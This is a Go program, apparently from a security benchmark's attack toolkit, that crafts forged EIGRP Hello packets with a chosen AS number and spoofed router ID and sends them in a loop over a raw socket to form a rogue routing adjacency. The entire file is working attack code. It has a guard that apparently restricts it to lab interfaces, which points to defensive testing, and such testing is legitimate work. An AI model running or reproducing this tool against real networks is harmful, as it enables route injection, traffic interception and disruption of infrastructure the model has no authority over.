package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const eigrpProto = 88

func internetChecksum(data []byte) uint16 {
	var sum uint32
	for len(data) >= 2 {
		sum += uint32(binary.BigEndian.Uint16(data[:2]))
		data = data[2:]
	}
	if len(data) == 1 {
		sum += uint32(data[0]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func buildEIGRP(asn int) ([]byte, error) {
	if asn < 0 {
		return nil, fmt.Errorf("invalid EIGRP AS number %d", asn)
	}
	message := make([]byte, 20+12)
	message[0] = 2
	message[1] = 5
	binary.BigEndian.PutUint32(message[16:20], uint32(asn))
	// EIGRPParam(type=1,len=12,k1=1,k2=0,k3=1,k4=0,k5=0,reserved=0,holdtime=15).
	binary.BigEndian.PutUint16(message[20:22], 1)
	binary.BigEndian.PutUint16(message[22:24], 12)
	message[24] = 1 // k1
	message[26] = 1 // k3
	// k4(27), k5(28), reserved(29) all stay zero. holdtime is the FINAL two
	// bytes of the 12-byte TLV (offset 30:32), not 28:30 — k5+reserved sit
	// between k4 and holdtime, so getting this off by one field silently
	// clobbers k5/reserved with holdtime's bytes and leaves the real
	// holdtime field zero (confirmed against scapy-eigrp.py's EIGRPParam
	// fields_desc: type,len,k1,k2,k3,k4,k5,reserved,holdtime).
	binary.BigEndian.PutUint16(message[30:32], 15)
	binary.BigEndian.PutUint16(message[2:4], internetChecksum(message))
	return message, nil
}

func buildHello(asn int, routerID string, srcMAC net.HardwareAddr) ([]byte, error) {
	srcIP := net.ParseIP(routerID).To4()
	if srcIP == nil {
		return nil, fmt.Errorf("invalid IPv4 router ID %q", routerID)
	}
	eigrp, err := buildEIGRP(asn)
	if err != nil {
		return nil, err
	}
	frame := make([]byte, 14)
	copy(frame[0:6], []byte{0x01, 0x00, 0x5e, 0x00, 0x00, 0x0a})
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	frame = append(frame, attackcommon.BuildIPv4(srcIP, net.IPv4(224, 0, 0, 10), eigrpProto, eigrp)...)
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("EIGRP rogue adjacency: send forged Hello packets")
	asn := fs.Int("asn", 100, "")
	routerID := fs.String("router_id", "9.9.9.9", "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	srcMAC := attackcommon.InterfaceMAC(common.Iface)
	frame, err := buildHello(*asn, *routerID, srcMAC)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("EIGRP packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("eigrp_rogue", fmt.Sprintf("EIGRP Hello len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildHello(*asn, *routerID, srcMAC)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send EIGRP frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("EIGRP Hello #%d asn=%d router-id=%s", n+1, *asn, *routerID))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
